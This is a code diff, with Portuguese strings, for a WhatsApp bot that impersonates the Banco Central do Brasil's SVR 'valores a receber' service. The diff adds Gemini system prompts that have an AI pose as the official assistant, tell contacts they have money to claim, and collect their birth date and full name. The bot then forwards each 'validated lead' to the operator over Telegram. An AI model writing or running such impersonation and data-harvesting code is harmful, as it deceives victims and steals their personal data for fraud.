@@ -30,19 +30,37 @@ console.log(`📡 ENDPOINT: ${API_URL}`);
 console.log(`🛡️ SEGURANÇA: ATIVA`);
 console.log(`---------------------------------------------\n`);
 
-async function askAI(prompt, userMessage) {
-    if (!GEMINI_KEY) return "Para sua segurança, prossiga com a validação digitando o dado solicitado.";
+const AI_PROMPTS = {
+    initial: `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber), um canal oficial do Banco Central do Brasil.
+    Um usuário entrou em contato. Responda de forma cordial e natural à mensagem dele (não ignore o que ele disse),
+    depois explique brevemente que ele possui valores a receber no sistema e que para liberar o resgate é necessário validar a identidade.
+    Finalize SEMPRE pedindo a data de nascimento, deixando claro o formato: DD/MM/AAAA.
+    Use formatação WhatsApp: *negrito* para termos importantes. Seja conciso, no máximo 5 linhas.`,
+
+    validacao_data: `Você é o Assistente Oficial do SVR. O usuário está no passo de informar a data de nascimento para validação de identidade.
+    Ele enviou uma mensagem que não é uma data válida. Responda de forma empática e breve ao que ele disse,
+    então peça novamente a data de nascimento no formato DD/MM/AAAA.
+    Use formatação WhatsApp: *negrito*. Máximo 3 linhas.`,
+
+    validacao_nome: `Você é o Assistente Oficial do SVR. O usuário está no passo de informar o nome completo para validação de identidade.
+    Ele enviou algo que não parece um nome completo válido. Responda de forma empática e breve,
+    então peça o nome completo novamente, conforme consta no documento oficial.
+    Use formatação WhatsApp: *negrito*. Máximo 3 linhas.`
+};
+
+async function askAI(context, userMessage) {
+    if (!GEMINI_KEY) return null;
     try {
         const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
-        const systemPrompt = `Você é o Assistente Oficial do SVR. Seu objetivo é validar os dados do usuário para o resgate do PIX.
-        Seja curto, formal e não saia do assunto. Use negrito.`;
+        const systemPrompt = AI_PROMPTS[context] || AI_PROMPTS.initial;
 
         const response = await axios.post(url, {
-            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário: ${userMessage}` }] }]
+            contents: [{ parts: [{ text: `${systemPrompt}\n\nMensagem do usuário: "${userMessage}"` }] }]
         });
-        return response.data.candidates[0].content.parts[0].text;
+        return response.data.candidates[0].content.parts[0].text || null;
     } catch (e) {
-        return "Prossiga com a validação dos dados solicitados para liberar seu resgate.";
+        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
+        return null;
     }
 }
 
@@ -110,7 +128,7 @@ client.on('disconnected', (reason) => {
 client.on('message_create', async (msg) => {
     const text = (msg.body || "").trim();
     const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
-    
+
     const targetChatId = msg.fromMe ? msg.to : msg.from;
     if (!targetChatId) return;
 
@@ -126,33 +144,30 @@ client.on('message_create', async (msg) => {
 
         const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
         const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
-        
+
         console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
-        
+
         let expectedData = null;
         if (userId) {
             try {
-                // Tentar buscar dados, mas não travar se falhar
                 const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, { timeout: 5000 });
                 expectedData = res.data;
-            } catch (e) { 
+            } catch (e) {
                 console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
             }
         }
 
         chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now(), createdAt: Date.now() });
         saveSessions();
-        
+
         setTimeout(async () => {
-            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
+            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
         }, 1500);
         return;
     }
 
     if (msg.fromMe) {
         if (currentSession && currentSession.mode === 'bot') {
-            // Só assume modo humano se a sessão tiver mais de 15s
-            // Evita que as respostas automáticas do próprio bot ativem o modo humano
             const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
             if (sessionAge > 15000) {
                 chatSessions.set(targetChatId, { mode: 'human' });
@@ -163,41 +178,69 @@ client.on('message_create', async (msg) => {
         return;
     }
 
-    if (!currentSession || currentSession.mode !== 'bot') return;
+    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
+    if (!currentSession || currentSession.mode !== 'bot') {
+        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
+        const chat = await msg.getChat();
+        await chat.sendStateTyping();
+
+        // Criar sessão automaticamente no passo 1
+        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId: null, expectedData: null, lastMsgTime: Date.now(), createdAt: Date.now() });
+        saveSessions();
+
+        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
+
+        // IA responde de forma natural à mensagem e já conduz para o resgate
+        const aiReply = await askAI('initial', text);
+        const fallback = `👋 *Olá! Sou o assistente oficial do SVR.*\n\nIdentifiquei que você possui *valores a receber* cadastrados em nosso sistema.\n\nPara liberar seu resgate com segurança, precisamos validar sua identidade.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`;
+
+        setTimeout(async () => {
+            await client.sendMessage(targetChatId, aiReply || fallback);
+        }, 1500);
+        return;
+    }
 
     currentSession.lastMsgTime = Date.now();
     console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);
-    
+
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
     if (currentSession.step === 1) {
-        // Regex mais flexível para data (DD/MM/AAAA ou DD/MM/AA ou apenas números)
-        const dateMatch = text.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4}|\d{2})/);
-        
-        if (dateMatch) {
-            const typedDate = text; // Mantemos o que o usuário digitou
-            
-            // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
-            if (currentSession.expectedData?.birthDate) {
-                const cleanTyped = typedDate.replace(/\D/g, "");
-                const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
-                
-                if (cleanTyped !== cleanExpected && !typedDate.includes(currentSession.expectedData.birthDate)) {
-                    await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada não confere com nossos registros.\n\nPor favor, digite a data **correta**.`);
-                    return;
-                }
-            }
+        // Regex para data (DD/MM/AAAA ou DD/MM/AA)
+        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);
 
-            currentSession.step = 2;
-            currentSession.birthDate = typedDate;
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-            await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
-        } else {
-            const aiReply = await askAI("validacao_data", text);
-            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Use o formato DD/MM/AAAA`);
+        if (!dateMatch) {
+            // Formato inválido — IA responde de forma natural
+            const aiReply = await askAI('validacao_data', text);
+            const fallback = `❌ *Formato de data inválido.*\n\nPor favor, digite sua data de nascimento no formato correto.\n\n📌 *Exemplo:* 10/05/1990`;
+            await msg.reply(aiReply || fallback);
+            return;
         }
+
+        const typedDate = text.trim();
+
+        // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
+        if (currentSession.expectedData?.birthDate) {
+            const cleanTyped = typedDate.replace(/\D/g, "");
+            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
+
+            if (cleanTyped !== cleanExpected) {
+                const aiReply = await askAI('validacao_data', `Minha data é ${typedDate}`);
+                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada *não confere* com nossos registros.\n\nPor favor, verifique e tente novamente.\n📌 *Formato:* DD/MM/AAAA`;
+                await msg.reply(aiReply || fallback);
+                return;
+            }
+        }
+
+        // Data aceita — avançar para etapa 2
+        currentSession.step = 2;
+        currentSession.birthDate = typedDate;
+        chatSessions.set(targetChatId, currentSession);
+        saveSessions();
+        await msg.reply(
+            `✅ *Data de nascimento confirmada!*\n\n` +
+            `📍 *ETAPA 2:* Agora digite seu *Nome Completo* (conforme consta no documento):`);
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
         if (typedName.length >= 8 && typedName.includes(" ")) {
@@ -205,22 +248,24 @@ client.on('message_create', async (msg) => {
                 const portalName = currentSession.expectedData.fullName.toLowerCase();
                 const firstName = typedName.toLowerCase().split(' ')[0];
                 if (!portalName.includes(firstName)) {
-                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
+                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu *Nome Completo*:`);
                     return;
                 }
             }
 
             await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
-              `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
-              `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
-              `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
-            
-            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
+                `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
+                `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
+                `Aguarde o *Protocolo Final de Liberação* ser gerado pelo sistema.`);
+
+            await notifyTelegram(`💰 <b>LEAD VALIDADO!</b>\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
             chatSessions.delete(targetChatId);
             saveSessions();
         } else {
-            const aiReply = await askAI("validacao_nome", text);
-            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo.`);
+            // Nome inválido — IA responde de forma natural
+            const aiReply = await askAI('validacao_nome', text);
+            const fallback = `⚠️ *Nome inválido.*\n\nPor favor, digite seu *Nome Completo* conforme consta no documento.`;
+            await msg.reply(aiReply || fallback);
         }
     }
 });
@@ -232,11 +277,11 @@ setInterval(async () => {
         try {
             const cmdPath = path.join(process.cwd(), file);
             const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
-            
+
             console.log(`📤 Enviando comando externo para: ${cmd.to}`);
             await client.sendMessage(cmd.to, cmd.message);
-            
-            fs.unlinkSync(cmdPath); 
+
+            fs.unlinkSync(cmdPath);
         } catch (e) {
             console.error("❌ Erro ao processar comando externo:", e.message);
         }
